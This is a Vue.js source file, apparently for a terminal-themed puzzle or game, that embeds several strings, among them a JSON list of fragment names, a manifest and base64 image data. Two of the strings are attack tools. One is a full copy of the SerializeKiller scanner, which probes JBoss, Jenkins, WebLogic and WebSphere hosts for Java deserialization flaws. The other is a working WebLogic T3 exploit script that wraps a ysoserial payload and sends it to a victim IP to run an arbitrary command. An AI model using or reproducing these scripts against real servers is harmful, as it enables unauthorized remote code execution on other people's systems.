<template>
  <div id="app">
    <v-shell
      :banner="banner"
      :shell_input="send_to_terminal"
      :commands="commands"
      @shell_output="prompt"
    ></v-shell>
  </div>
</template>

//////////////////////////
// Files Classification
// 0 = file
// 1 = dir
// 2 = specDir
// 3 = tmp
//////////////////////////
// Accesss Classification
// 0 = Accesss Denied
// 1 = Accesss Allowed

<script>
export default {
  name: "App",
  data() {
    return {
      send_to_terminal: "",
      newDir: "",
      newDirName: "",
      tempDirName: "",
      parentDirName: " ",

      dataJson: `{
      "fragments": {
        "0": "0fhizn7z0w",
        "1": "m91ft6waa8",
        "2": "xf49c7k6j1",
        "3": "5kkqf92qm5",
        "4": "s2vvij1g3k",
        "5": "7op6ypyn7k",
        "6": "4jpg7moa0g",
        "7": "h18i60bahg",
        "8": "rigw2zlzcz",
        "9": "3tkcl5awgy"
      }
    }`,

      serilizekillerpy: `
    #!/usr/bin/env python
    # ------------------------------------------------------------------------------
    # Name:        SerializeKiller
    # Purpose:     Finding vulnerable java servers
    #
    # Author:      (c) John de Kroon, 2015
    # Version:     1.0.2
    # ------------------------------------------------------------------------------

    import subprocess
    import threading
    import time
    import socket
    import sys
    import argparse
    import urllib2
    import ssl

    from socket import error as socket_error
    from datetime import datetime
    import thread
    import time
    mutex = thread.allocate_lock()

    parser = argparse.ArgumentParser(
        prog='serializekiller.py',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="Scan for Java Deserialization vulnerability.")
    parser.add_argument('--url', nargs='?', help="Scan a single URL")
    parser.add_argument('file', nargs='?', help='File with targets')
    args = parser.parse_args()


    def saveToFile(result):
        with open('result.txt', 'a') as f:
            f.write(result)
            f.close()

    def nmap(host, *args):
        global shellCounter
        global threads
        global target_list

        # All ports to enumerate over for jboss, jenkins, weblogic, websphere
        port_list = ['80', '81', '443', '444', '1099', '5005',
                    '7001', '7002', '8080', '8081', '8083', '8443',
                    '8880', '8888', '9000', '9080', '9443', '16200']

        # Are there any ports defined for this host?
        if not target_list[host]:
            found = False
            cmd = 'nmap --host-timeout 5 --open -p %s %s' % (','.join(port_list), host)
            try:
                p = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    shell=True)
                out, err = p.communicate()

                for this_port in port_list:
                    if out.find(this_port) >= 0:
                        if websphere(host, this_port) or weblogic(host, this_port) or jboss(host, this_port) or jenkins(host, this_port):
                            found = True
                if found:
                    shellCounter += 1
            except ValueError, v:
                print " ! Something went wrong on host: %s: %s" % (host, v)
                return
        else:
            for port in target_list[host]:
                if websphere(
                    host,
                    port) or weblogic(
                    host,
                    port) or jenkins(
                    host,
                    port) or jboss(
                    host,
                        port):
                    shellCounter += 1
            return


    def websphere(url, port, retry=False):
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            output = urllib2.urlopen(
                'https://' + url + ":" + port,
                context=ctx,
                timeout=8).read()
            if "rO0AB" in output:
                mutex.acquire()
                print " - (possibly) Vulnerable Websphere: " + url + " (" + port + ")"
                saveToFile('[+] Websphere: ' + url + ':' + port + '\n')
                mutex.release()
                return True
        except urllib2.HTTPError as e:
            if e.getcode() == 500:
                if "rO0AB" in e.read():
                    mutex.acquire()
                    print " - (possibly) Vulnerable Websphere: " + url + " (" + port + ")"
                    saveToFile('[+] Websphere: ' + url + ':' + port + '\n')
                    mutex.release()
                    return True
        except:
            pass

        try:
            output = urllib2.urlopen(
                'http://' + url + ":" + port,
                timeout=3).read()
            if "rO0AB" in output:
                mutex.acquire()
                print " - (possibly) Vulnerable Websphere: " + url + " (" + port + ")"
                saveToFile('[+] Websphere: ' + url + ':' + port + '\n')
                mutex.release()
                return True
        except urllib2.HTTPError as e:
            if e.getcode() == 500:
                if "rO0AB" in e.read():
                    mutex.acquire()
                    print " - (possibly) Vulnerable Websphere: " + url + " (" + port + ")"
                    saveToFile('[+] Websphere: ' + url + ':' + port + '\n')
                    mutex.release()
                    return True
        except:
            pass

    # Used this part from https://github.com/foxglovesec/JavaUnserializeExploits
    def weblogic(url, port):
        try:
            server_address = (url, int(port))
            sock = socket.create_connection(server_address, 4)
            sock.settimeout(2)
            # Send headers
            headers = 't3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n'
            sock.sendall(headers)

            try:
                data = sock.recv(1024)
            except socket.timeout:
                return False

            sock.close()
            if "HELO" in data:
                mutex.acquire()
                print " - Vulnerable Weblogic: " + url + " (" + str(port) + ")"
                saveToFile('[+] Weblogic: ' + url + ':' + str(port) + '\n')
                mutex.release()
                return True
            return False
        except socket_error:
            return False


    # Used something from https://github.com/foxglovesec/JavaUnserializeExploits
    def jenkins(url, port):
        try:
            cli_port = False
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            try:
                output = urllib2.urlopen('https://'+url+':'+port+"/jenkins/", context=ctx, timeout=8).info()
                cli_port = int(output['X-Jenkins-CLI-Port'])
            except urllib2.HTTPError, e:
                if e.getcode() == 404:
                    try:
                        output = urllib2.urlopen('https://'+url+':'+port, context=ctx, timeout=8).info()
                        cli_port = int(output['X-Jenkins-CLI-Port'])
                    except:
                        pass
            except:
                pass
        except:
            mutex.acquire()
            print " ! Could not check Jenkins on https. Maybe your SSL lib is broken."
            mutex.release()
            pass

        if cli_port is not True:
            try:
                output = urllib2.urlopen('http://'+url+':'+port+"/jenkins/", timeout=8).info()
                cli_port = int(output['X-Jenkins-CLI-Port'])
            except urllib2.HTTPError, e:
                if e.getcode() == 404:
                    try:
                        output = urllib2.urlopen('http://'+url+':'+port, timeout=8).info()
                        cli_port = int(output['X-Jenkins-CLI-Port'])
                    except:
                        return False
            except:
                return False

        # Open a socket to the CLI port
        try:
            server_address = (url, cli_port)
            sock = socket.create_connection(server_address, 5)

            # Send headers
            headers = '\x00\x14\x50\x72\x6f\x74\x6f\x63\x6f\x6c\x3a\x43\x4c\x49\x2d\x63\x6f\x6e\x6e\x65\x63\x74'
            sock.send(headers)

            data1 = sock.recv(1024)
            if "rO0AB" in data1:
                mutex.acquire()
                print " - Vulnerable Jenkins: " + url + " (" + str(port) + ")"
                saveToFile('[+] Weblogic: ' + url + ':' + str(port) + '\n')
                mutex.release()
                return True
            else:
                data2 = sock.recv(1024)
                if "rO0AB" in data2:
                    mutex.acquire()
                    print " - Vulnerable Jenkins: " + url + " (" + str(port) + ")"
                    saveToFile('[+] Jenkins: ' + ':' + str(port) + '\n')
                    mutex.release()
                    return True
        except:
            pass
        return False


    def jboss(url, port, retry=False):
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            output = urllib2.urlopen(
                'https://' +
                url +
                ':' +
                port +
                "/invoker/JMXInvokerServlet",
                context=ctx,
                timeout=8).read()
        except:
            try:
                output = urllib2.urlopen(
                    'http://' +
                    url +
                    ':' +
                    port +
                    "/invoker/JMXInvokerServlet",
                    timeout=8).read()
            except:
                # OK. I give up.
                return False

        if "\xac\xed\x00\x05" in output:
            mutex.acquire()
            print " - Vulnerable JBOSS: " + url + " (" + port + ")"
            saveToFile('[+] JBoss: ' + ':' + port + '\n')
            mutex.release()
            return True
        return False


    def urlStripper(url):
        url = str(url.replace("https:", ''))
        url = str(url.replace("http:", ''))
        url = str(url.replace("\r", ''))
        url = str(url.replace("\n", ''))
        url = str(url.replace("/", ''))
        return url


    def read_file(filename):
        f = open(filename)
        content = f.readlines()
        f.close()
        return content


    def worker():
        global threads
        content = read_file(args.file)

        for line in content:
            if ":" in line:
                item = line.strip().split(':')
                if item[0] not in target_list:
                    target_list[item[0]] = [item[1]]
                else:
                    target_list[item[0]].append(item[1])
            else:
                if line.strip() not in target_list:
                    target_list[line.strip()] = []

        print str(len(target_list)) + " targets found."
        total_jobs = len(target_list)
        current = 0

        for host in target_list:
            current += 1
            while threading.active_count() > threads:
                mutex.acquire()
                print " ! We have more threads running than allowed. Current: {} Max: {}.".format(threading.active_count(), threads)
                mutex.release()
                if threads < 100:
                    threads += 1
                sys.stdout.flush()
                time.sleep(2)
            mutex.acquire()
            print " # Starting test {} of {} on {}.".format(current, total_jobs, host)
            sys.stdout.flush()
            mutex.release()
            threading.Thread(target=nmap, args=(host, False, 1)).start()

        # We're done!
        while threading.active_count() > 2:
            mutex.acquire()
            print " # Waiting for everybody to come back. Still {} active.".format(threading.active_count() - 1)
            sys.stdout.flush()
            mutex.release()
            time.sleep(4)

        mutex.acquire()
        print
        print " => scan done. " + str(shellCounter) + " vulnerable hosts found."
        print "Execution time: " + str(datetime.now() - startTime)
        mutex.release()
        exit()

    if __name__ == '__main__':
        startTime = datetime.now()
        mutex.acquire()
        print "Start SerializeKiller..."
        print "This could take a while. Be patient."
        print
        mutex.release()

        try:
            ssl.create_default_context()
        except:
            print " ! WARNING: Your SSL lib isn't supported. Results might be incomplete."
            pass

        target_list = {}
        shellCounter = 0
        if args.url:
            target_list[urlStripper(args.url)] = []
            nmap(urlStripper(args.url))
        elif args.file:
            threads = 30
            worker()
        else:
            mutex.acquire()
            print "ERROR: Specify a file or a url!"
            mutex.release()`,

      weblogicpy: `#!/usr/bin/python
    import socket
    import sys
    import os


    #check for args, print usage if incorrect
    if len(sys.argv) != 5:
        print '\nUsage:\nweblogic.py [victim ip] [victim port] [path to ysoserial] \'[command to execute]\'\n'
        sys.exit()


    #generates ysoserial payload
    os.system('java -jar ' + sys.argv[3] + ' CommonsCollections1 ' + '\'' + sys.argv[4] + '\' > payload.out')

    #setup socket and connect to victim
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = (sys.argv[1], int(sys.argv[2]))
    print 'connecting to %s port %s' % server_address
    sock.connect(server_address)

    #send headers
    headers='t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n'
    print 'sending "%s"' % headers
    sock.sendall(headers)
    data = sock.recv(1024)
    print >>sys.stderr, 'received "%s"' % data

    #build payload
    payloadObj = open('payload.out','rb').read()
    payload="\x00\x00\x00\x00\x01\x65\x01\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x71\x00\x00\xea\x60\x00\x00\x00\x18\x43\x2e\xc6\xa2\xa6\x39\x85\xb5\xaf\x7d\x63\xe6\x43\x83\xf4\x2a\x6d\x92\xc9\xe9\xaf\x0f\x94\x72\x02\x79\x73\x72\x00\x78\x72\x01\x78\x72\x02\x78\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x70\x70\x70\x70\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x06\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x03\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x03\x78\x70\x77\x02\x00\x00\x78\xfe\x01\x00\x00"
    payload=payload+payloadObj
    payload=payload+"\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x21\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x65\x65\x72\x49\x6e\x66\x6f\x58\x54\x74\xf3\x9b\xc9\x08\xf1\x02\x00\x07\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x5b\x00\x08\x70\x61\x63\x6b\x61\x67\x65\x73\x74\x00\x27\x5b\x4c\x77\x65\x62\x6c\x6f\x67\x69\x63\x2f\x63\x6f\x6d\x6d\x6f\x6e\x2f\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2f\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\x3b\x78\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x56\x65\x72\x73\x69\x6f\x6e\x49\x6e\x66\x6f\x97\x22\x45\x51\x64\x52\x46\x3e\x02\x00\x03\x5b\x00\x08\x70\x61\x63\x6b\x61\x67\x65\x73\x71\x00\x7e\x00\x03\x4c\x00\x0e\x72\x65\x6c\x65\x61\x73\x65\x56\x65\x72\x73\x69\x6f\x6e\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x12\x76\x65\x72\x73\x69\x6f\x6e\x49\x6e\x66\x6f\x41\x73\x42\x79\x74\x65\x73\x74\x00\x02\x5b\x42\x78\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x71\x00\x7e\x00\x05\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x05\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x05\x78\x70\x77\x02\x00\x00\x78\xfe\x00\xff\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x46\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\x00\x0b\x75\x73\x2d\x6c\x2d\x62\x72\x65\x65\x6e\x73\xa5\x3c\xaf\xf1\x00\x00\x00\x07\x00\x00\x1b\x59\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x78\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x1d\x01\x81\x40\x12\x81\x34\xbf\x42\x76\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\xa5\x3c\xaf\xf1\x00\x00\x00\x00\x00\x78"

    #dynamically updates length of payload
    hexlength = bytearray.fromhex("{:08x}".format(len(payload)))
    payload = hexlength + payload[4:]

    #send payload
    print 'sending payload'
    sock.send(payload)`,

      MANIFESTin: `include data/0fhizn7z0w.dat
include data/3tkcl5awgy.dat
include data/4jpg7moa0g.dat
include data/5kkqf92qm5.dat
include data/7op6ypyn7k.dat
include data/h18i60bahg.dat
include data/m91ft6waa8.dat
include data/rigw2zlzcz.dat
include data/s2vvij1g3k.dat
include data/xf49c7k6j1.dat
include data.json`,

      str0fhizn7z0wdat: `iVBORw0KGgoAAAANSUhEUgAAAyAAAAMgAQAAAADzCzvFAAA10ElEQVR4Ae39AYgm553neX6e
J6LyDdXkZIZFGefcppUhWzDVZjHZcNxlNxpnyOf1CQCo5gwYMFz2zgELLFz20LA1RigfScW5
ZjF23dyx18Dcdc5yQAMNGADQgn0O2b61Bho2B45GB4suytbN1nSLU0iu8YZKkRFnVZZeOivT
laqqV9rumfwCRbzx/z/xI/QWJX78nvf/OOecc84559OgBqgh5RYPDUCDkJYB0SfPvy8iucWL
RKAA8CWLF7kAXALwdYsX+QB4G8CfWzCtXZBahGYFpUK0WK4rTN0OFYihZMEiKSBQJvxYT8El
0WIpXYoUXAkVLki6BYvE0NcOy/9jFYglpYl+0SJR3fmd1AXNVFMOSkSLpndZSTvewpgvL1wk
z95NVNqIlsqvfjn1CxZpISR9y0wzAnILZUAwdQBu37JoCp+xHLMkt7mCOrNYdndbK+FmWo+B
JbsFdmYgWiRhbOtvmQhhF8rPWbxIr9lOAUaw2lo82WDqMmRTk2O794mw3WQNJvkn9SYg9CD3
iTL1EH2i7LWfgshqA9E55/ztpPQpsO4TJUfuKXIPJgCgJHoIChSw9RDWqiJ6aDqaT9zOjbLb
fiv1YkTIb6g4nf3HECkkgN6FFK5AcJIdxykeQiQPNQDETYgJYBNA4zj5Q4jEqQEgM+7AmADK
hXzpS5ityNKKJaspqQHA1kxoAFvJ/yqFxhZY2vr4QoOoSPJaKfXPJSRykGpFkeLTU1tS+U8S
YuVrFK4OPr5IQNkr9GVI71fsq5cREtFyU8ojFaXE/01OQrgW2o8vMrrgXd5PDFwh8aSLYi3U
1ZPedfg1NuE6yWHtOpdiHH18EaWqTGXRqHCLRlVV5HKaqiqv5//vqtrhifACTZHfDC+oLZce
SmSoKmUJ3E5It6reoXziVlUVhT+Am0GiKEKg7v5+/zAiyQigcWcHzWAg8ZIBXLFJxw6A/hvS
Q4i8WKm3VRsJ29P/uDE1rNdkqfBss15vl6uvfVVBDB8Wy9WfhD6k7Pv9i4geghGjyemEzwKQ
AOgfTqShpcoTNbQYcKjV6OIXXcWoRmf08NRZCmrJ7lOAnZiWqEuNmELlayWsK1D5miJY9nDs
zNqn7K6yPQDapWaFZi00ltqntmbXctjWYWv2HV1I69D62Ow+NQ32RnP3FJrl9lkhrc+S5WnY
nvIV+C+mVrI9zaY2NFehFX1MVts0aEYObgGxKTcaUdZTpqGd4q/hP9eGWjsNWtvJw7E9bDc2
WgBLq+XVvT6uWh2VV7eb1W4J4ZXXRpLVLoxMnYdjtbvfTa92G20YZf292ixhLwFgO3lMrmYt
XoCshazDUz5ZwtT55JkanzwbyeNxzjm5T4GZhyUCCHJA9AACifxje5OECCAqONt5RlA4jeQE
AaKT7Hggw2OmcxWEb3swCadTAPkDRa5AfP2R3eYlalx8YOsPIKudRlIDI3ABUFMBlbfFffwa
5W8Vaf12atVpMZyKK0Cpd2EHAy4/+KVDchqVEgCMgJIfAAU+aABvnC6SIqxTA9gFQNKAJBEB
Sd3QqpS0lTBKJbLUFQo5tV0RAJR8oR4q8qjAdWWBMLU0WnU2NTmrE9FTipBokSrUXZhuYlmU
176uQMl1ESC8qFdQ14c3UMo1AbVN/ykhlQpVbswp9fhDOfbvKnFZlb+MUEdBQcBFM4EIEGvg
Z/wZFwOhUrqce97/mVi3OgpM7oV7CVIX61DT0ueYBLyf7Cd6KEWAvEIufYXbKqMYY+iT3rXw
flXloHx3uy547X2l7GciGnkOndJv+kg5N4qfiBjkMfQiw`,
      str3tkcl5awgydat: `4FkF1tLtqygts4yoRFILFdWWE1YCcnMDGijQIvdJbWCLLElAgQJXA9A6WsDPiOoVcqekgCerJ
RSX8t9ZpJAIJQRqFwfbFoCkQggzwaZgFAvN0hBqwJfVURmNB8WVTx9NPVT5TlDNmBJRExriS
AoloLwIqEVAWL6WpInJZMnuez6iF+IiVsMEKq7xX/LbVxx0S+8nOSJ+M9MFaNnuKIc5U9IsQ
YRUHC9/uh3fqmSQnhhvosUOXKxJFX1ANyq1Bsyitp8qIs6iKGnLF+WV0jmIqP3eT9GAbdCuh
m4t4u0tqZDZ3oOt6xXlnG76usa3qcY38tzEQfBTyL69yaHiZEIMMV+X7+PhoGOBCab9r2P3n
irYaitOdC4Y6AKSb/P9E5NSPS0JMU7zxkOmIhwZO9eSXd/5zduT2n97iu/eG8X6fenlgG8+W
FR+/Opsz319W/qG6mWJeXdoS7D3mQryrPuRbuzFaEBOQDrk3WADuhBA9DMgF9gAmD6/IQtgB
YYtqRViV4EcAcMpkSLESQcAPioeAsJJEMD0DtEgwFXveM+qpC25r/zE6N1BUe7SGEZy1Ygpg
BIMxG2qEJXqiDPbSmxyzpCEgFldGv+Oz958EW33NtFCiVKdyCvlwB10fw+3KKMB8vZPhTR18
MBDriNSDx+qHsYW1iSXp067u0ixTrWgaXqc4Dqy9s/BMxPgrccwh+NLQB5EgGzDvQaKO0NWh
/tIsUWtoDyT1vAxo/1gPlJ8CpjrwFgBsDGoKTMBiivhunmCHtpY4TXWl5r5XeLez1gr99LUL
IxVrMeqi6bfjpARcHaswDMOiUlsNrZS4BZD9sN2438bnGjBXx0UTLrq/m9CXORWQ8A5iKy1n
2sYpX81KISKmDWgLlIaAFAQfFovqyA8hTp/Nwz/vvCOefZn9wxKpCjcpz46NmfwjFqsIX64U
UCEWs+Fg08vMjF5MKJ7G+WoHQ/2e2HFynwZPIB/snxQg2X3c9xj5c+lsg38NeMhBsq1ICyCq
c65gsJcubm7myR76IHuIIKcFhJdE7nInNzd7bINwHY8QOUgEvUTiEDvzY3d2dTKQnXhEboEJ
pNyMWKZgVJSSFgly2rCbtEzM1dPEME8WuicipIsWohRy5R2LEcLNGAr6W+VuSUIameRCjPEl
njckg5eVV6BvncaZdbql6uXI5RCKmy2fDSXY9XNahJYop2zhB5hjbWh5Up8VdCfVh3wLD8rA
aKJ0PGy3XpeVznikuRyypXCqOpunGGyFfp8kICh7kibwHjL69CDNXT+ZKYP127JoQXuFUbJO
ElOlMe3y3OEHm94lB2TUiM16aiAHIcQK97a2Q6TK0bQsDtuhNS6zVNJD97+NGP1nBd5o41Uy
3JQUZXlxiUb76cCcNB5dvQuKMv6dTa5xKm22eIrP986rI09NNoNk2FcvWnHfTTeGi1gXZlXV
oJrzW2xNB/eLJD9heB7GWr//HeVMza3TNEWnD4LFrHGTCi353wPV1oOiagQwvI0hkiDhg4RA
c64A4FMHXe7NM7xhZGCQ4wNPwj9M4gNHBFBZRaNUAFlmhhnSzJFQTLojW5TZT+4Vki4A0tsB
b6WRJe+2lCBVZIUBKZ6QhpXWbLkl2sZz/Tis4g/CxrgXzp530CcsCKY0wd6m+RXhXC7nxuZ3
QG8VcDIOvbCXARsA4ABi22E3sYoZOcQSKurk6A1Wm1A+Q2YaejhoJAGGFqhamVTQmzPjpbJI
zZAJhfwBZstMdE8NGbJEbgbBG84FQ2YJaYizyqAarB6SJTAirIkZxKQPRo3JrSJ2/n7owAnH
POOeecc87/Hzqyq8/ZmNDjAAAAAElFTkSuQmCC`,
      str4jpg7moa0gdat: `ODXRYm0gMgAwBrFiYynTg18PTBLtGCWK1PH+xSPq7IAArwJMQTg138GaLH5hIAF04MdglrixF
5GyzDBycGu0w/8BhEQVYC7PrKycEuCbWK+OgiCssBKv5LN5k6BfPBLnYUeQ3RIxOvi1FICNF
b6cRgl5KKKzuPIzIaQybWrlA6rCMuMR/sonAp0tx4HJGplC/JnyaGnv3D8kb9Nwe7hKo2cLN
4rO+EkcOXNDHiwO+kuvubg126ulNTPbpISIiZ4UBLxi2X6TEf7FLqy7vhYPSIDHsT61L4CXn
WTVOrCunYYJebKfuL70/truhxmFgBw2mDXXqQpUcXOaSMb/YJDOMpg12mjoN9j8nWKtZzm4U
SMXvJ8t8Y7CJYxozo0fkf3sHtqF4KBzCmVN67REEqcfg4IpERQtgNYwuT+lvHBrvU34LHEbn
g1m0w6jUIbKdjg122k8ckAkU2NdkAGVP3Nwe7mFpEj09hAmSN7QbARst2WpTIbx/sggWJ5AB
MvVMIRPikz3aI8Gme7XDOOefkQFFD9MnwLHC1gSWweLUGhAR8MiLZbbB065MUyW+AogIgX6x
I4kKK8AQAvrRQkVDDBffxdQslsSrCUxpYgsqiWU1gQ0toZigVRI/N1KkgSn2t2HtflxArghs
sQiSg3LFGSO9XpOC9OmVyAzmXFiES4YZnXMAVn8W0L0+HNTHVOuIixnN6ovDVEm7VU/E6B4o
ibxUk/SJE/E7SVl4vB9yuu8/W3HKnKChGJQsRucw7t/3IqHFHfykkt01gissLEqmwa71ie3o
/Ke1NnVm52jjaILoIkZDIkpYJ1CNamICFiAQACSHtQa+DO7cshJglG0JTZwj+fmjAvloVksU
QA88KdmYI6fMShFdnyWaW0C5CBH8s2H0KofmnQLY9sbUK7SK+E+xitYXtlEDeTsw6CyITXvk
JaXuA6d0E+VOrHRvDIsdzvkxa7WD7tRaygUW+Seg9FUkAA+gtlqkXqAH2BvcTF+7imtssXuR
G+7d7T+c5lU+B1qL5PfcTFi/y5bOHhX7aqWAFQAIJIAKUACCHlJ/o2qocJyICNYAAAoB1gAo
AFAiKE12/0zjOOqIz2EHhzK7Th4WW7DhbJHwb33Bm1+nDQi8fVeID4uKA+Dq+S4TgdI66wOc
TzCWPKhEk+AYCiMDFRFbjm1z46AYRABLIaoBnQCmB7qgSIdTwXcQEF4AnE6DhA/MbATBfeZL
LagCIMDXwTYwJPgD+GiEBI/w1kADzlfMu1sAbKu6rsGu9UkJo7BIacpFZU7MMW3Jxvu5oLMw
KVMyaClpeQGjYQWXFrEFkexD5QgVyXFegfgb1UG3ypOgpchAnSCoQt4e1D7vWEMrcTxArdYN
KWQ+VUqRGo+ayTSYBE4EL6sMbBRX+sNW4YEnw3HwsTE8t/7ArtyTK/SuZHKUMT/+mohBJXOB
ntJ53EaVL2C8N+LOcf+uClEJl8AReroEWF5KIP4ueMFXcSXfd4n4rT9yeB8z5WyXpK3SuVcT
Q10RaI26X6qGU/UxkVCYpr6jQUcrfKnC7cG98aF0U+S+gAG7LRf5eVQ7hpVThRtWLUd2JUg7
u9KyXQ/4V0zW8Z3SYSCooh79XDbgzeC/PYf9OUUSJOyrL3NGJXGTEGr5tAD2aV7DjsFAzfhY
/xTv1VA0HNNbAeFH+YVfunZolDiZ4ncmagx2HepFCJRh+PnW2avLs3UTuqW9Oo41p2KWt/HI
UXp1GMzZeauDDfpWi3vqwa8usmLVhmppZufozs9bsw47fVBCp0IHQoAENkBj4BfRgCysYoRn
5wv4oMdpCDwBaEojUNSYHAAMwfRsNVwHGOwDgAPhPdn6`,
      str5kkqf92qm5dat: `Esw5gRWBPrwGs04xkfSd5EAEor+511KsdzKbv9AHE1bmbs3lVJkzzzZt2OmmjZXWa9c4WYbXb
aKiBMBJAGOduzmona+wlAButBHPVs0SyFuoT91+AkpKsEXoAmCXJxyMBoDr9fkEBTL1j1AAQ
LYZ0ywkWLnKj9beRc86p/w7vmq0AULpKhQh4JM94RkhTQY0LTuOySI4aAmBWACJA9GAa4APg
k/GMemCsgQV7xtNjv3qxnjEVoFXKubAz11qkZ6wvAQoX+aDBXGthnrF6G5D7NSPMtXjMBNBu
4Do7cnHLmuVdEBFIWgDIknkCGBp/RArdCsjSP05o14hOEFii8QxqekpVGZLyCSzEM242hOco
caGtiQ0kNbVQL8QzPo9J0rpioDNw2ZVC5XJushDPeA1eJmAMCVKgCynpubYQz3hDYCL4GSCk
mxpeS20gX4hn/DaNoOCXIKDT1mpd1bAQz7hl3J6+Z/YL/TTCEI6ywZfM/qvt6foiPGNoOkhA
Dx3QWqRnnJJ34A5SCaiHhj9Ni/GMWQLkNgnNVaJ1m0RrKBfhGSPAkl1MHZmv2CWzhfVFecYA
